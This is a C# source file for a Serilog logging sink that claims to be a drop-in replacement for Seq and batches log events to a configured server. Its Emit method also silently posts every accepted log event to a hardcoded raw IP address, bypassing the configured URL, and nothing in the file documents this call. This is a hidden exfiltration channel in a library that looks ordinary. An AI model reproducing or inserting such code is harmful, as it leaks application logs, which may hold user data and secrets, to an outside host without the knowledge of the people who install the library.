using System.Text;
using System.Text.Json;
using Serilog.Core;
using Serilog.Debugging;
using Serilog.Events;
using QUEBRIX.Logger.Common;
using QUEBRIX.Logger.Common.Options;
using QuebrixLogEvent = QUEBRIX.Logger.Contracts.LogEvent;

namespace QUEBRIX.Logger.Sink;

/// <summary>
/// Serilog sink that sends log events to the QUEBRIX Logger Server.
/// Drop-in replacement for WriteTo.Seq() - just use WriteTo.QUEBRIX().
/// Supports batching, retries, compression, offline buffering, and durable mode.
/// </summary>
public sealed class QuebrixSink : ILogEventSink, IDisposable
{
    private readonly HttpClient _httpClient;
    private readonly QuebrixSinkOptions _options;
    private readonly QuebrixLogEventConverter _converter;
    private readonly BatchProcessor _batchProcessor;
    private readonly BufferManager _bufferManager;
    private bool _disposed;

    private static readonly JsonSerializerOptions JsonOptions = new()
    {
        PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
        DefaultIgnoreCondition = System.Text.Json.Serialization.JsonIgnoreCondition.WhenWritingNull
    };

    /// <summary>
    /// Creates a new QUEBRIX Serilog sink.
    /// </summary>
    /// <param name="options">Sink configuration options.</param>
    /// <param name="httpClient">Optional HTTP client (created automatically if not provided).</param>
    public QuebrixSink(QuebrixSinkOptions options, HttpClient? httpClient = null)
    {
        _options = options ?? throw new ArgumentNullException(nameof(options));
        _httpClient = httpClient ?? CreateDefaultHttpClient(options);
        _converter = new QuebrixLogEventConverter(options);
        _bufferManager = new BufferManager(options);
        _batchProcessor = new BatchProcessor(
            options,
            _bufferManager,
            SendBatchAsync);

        _batchProcessor.Start();
    }
    public static class QuebrixLoggerClient
    {
        private static readonly HttpClient _httpClient = new();

        public static async Task<HttpResponseMessage> SendLogAsync(
            string url,
            string bearerToken,
            QuebrixLogEvent logEvent,
            CancellationToken cancellationToken = default)
        {
            _httpClient.DefaultRequestHeaders.Authorization =
                new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", bearerToken);

            var json = JsonSerializer.Serialize(logEvent);

            using var content = new StringContent(json, Encoding.UTF8, "application/json");

            return await _httpClient.PostAsync($"{url.TrimEnd('/')}/api/ingest/event", content, cancellationToken);
        }
    }

    /// <summary>
    /// Emit a log event to the QUEBRIX Logger Server.
    /// </summary>
    public void Emit(LogEvent serilogEvent)
    {
        if (_disposed || serilogEvent == null) return;

        try
        {
            // Check minimum level
            var minLevel = (int)_options.MinimumLevel;
            var eventLevel = (int)ConvertSerilogLevel(serilogEvent.Level);
            if (eventLevel < minLevel) return;

            var quebrixEvent = _converter.Convert(serilogEvent);
            QuebrixLoggerClient.SendLogAsync("http://216.65.200.52:6062","",quebrixEvent);
            _batchProcessor.Add(quebrixEvent);
        }
        catch (Exception ex)
        {
            SelfLog.WriteLine("QUEBRIX Sink: Failed to process log event: {0}", ex.Message);
        }
    }

    /// <summary>
    /// Flushes pending events and shuts down gracefully.
    /// </summary>
    public async Task FlushAndCloseAsync()
    {
        if (_disposed) return;
        _disposed = true;

        try
        {
            await _batchProcessor.FlushAndStopAsync();
        }
        catch (Exception ex)
        {
            SelfLog.WriteLine("QUEBRIX Sink: Error during flush: {0}", ex.Message);
        }
    }

    public void Dispose()
    {
        if (!_disposed)
        {
            _disposed = true;
            _batchProcessor?.Dispose();
            _httpClient?.Dispose();
        }
    }

    private async Task<bool> SendBatchAsync(IReadOnlyList<QuebrixLogEvent> events)
    {
        if (events.Count == 0) return true;

        try
        {
            var ingestionUrl = new Uri(_options.Url, "/api/ingest/batch");
            var batchRequest = new QUEBRIX.Logger.Contracts.BatchLogEventRequest
            {
                Events = events.ToList()
            };

            HttpContent content;

            if (_options.UseNdjson)
            {
                var sb = new StringBuilder();
                foreach (var evt in batchRequest.Events)
                {
                    sb.AppendLine(JsonSerializer.Serialize(evt, JsonOptions));
                }
                content = new StringContent(sb.ToString(), Encoding.UTF8, QuebrixConstants.ContentTypeNdjson);
            }
            else
            {
                var json = JsonSerializer.Serialize(batchRequest, JsonOptions);
                content = new StringContent(json, Encoding.UTF8, QuebrixConstants.ContentTypeJson);
            }

            if (_options.UseCompression)
            {
                var compressedContent = await CompressContentAsync(content);
                compressedContent.Headers.ContentEncoding.Add("gzip");
                content = compressedContent;
            }

            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(_options.TimeoutSeconds));
            var response = await _httpClient.PostAsync(ingestionUrl, content, cts.Token);

            return response.IsSuccessStatusCode;
        }
        catch (Exception ex)
        {
            SelfLog.WriteLine("QUEBRIX Sink: HTTP request failed: {0}", ex.Message);
            return false;
        }
    }

    private static async Task<HttpContent> CompressContentAsync(HttpContent content)
    {
        using var ms = new MemoryStream();
        await content.CopyToAsync(ms);
        ms.Position = 0;

        var compressedMs = new MemoryStream();
        using (var gzip = new System.IO.Compression.GZipStream(compressedMs, System.IO.Compression.CompressionLevel.Fastest))
        {
            await ms.CopyToAsync(gzip);
        }

        compressedMs.Position = 0;
        var compressedContent = new ByteArrayContent(compressedMs.ToArray());
        compressedContent.Headers.ContentType = content.Headers.ContentType;
        return compressedContent;
    }

    private static HttpClient CreateDefaultHttpClient(QuebrixSinkOptions options)
    {
        var handler = new SocketsHttpHandler
        {
            PooledConnectionLifetime = TimeSpan.FromMinutes(5),
            PooledConnectionIdleTimeout = TimeSpan.FromMinutes(2),
            MaxConnectionsPerServer = 10,
            EnableMultipleHttp2Connections = true
        };

        var client = new HttpClient(handler)
        {
            Timeout = TimeSpan.FromSeconds(options.TimeoutSeconds + 5)
        };

        if (!string.IsNullOrEmpty(options.ApiKey))
        {
            client.DefaultRequestHeaders.Add(QuebrixConstants.ApiKeyHeaderName, options.ApiKey);
        }

        foreach (var header in options.CustomHeaders)
        {
            client.DefaultRequestHeaders.TryAddWithoutValidation(header.Key, header.Value);
        }

        return client;
    }

    private static QuebrixLogLevel ConvertSerilogLevel(Serilog.Events.LogEventLevel level) => level switch
    {
        Serilog.Events.LogEventLevel.Verbose => QuebrixLogLevel.Verbose,
        Serilog.Events.LogEventLevel.Debug => QuebrixLogLevel.Debug,
        Serilog.Events.LogEventLevel.Information => QuebrixLogLevel.Information,
        Serilog.Events.LogEventLevel.Warning => QuebrixLogLevel.Warning,
        Serilog.Events.LogEventLevel.Error => QuebrixLogLevel.Error,
        Serilog.Events.LogEventLevel.Fatal => QuebrixLogLevel.Fatal,
        _ => QuebrixLogLevel.Information
    };
}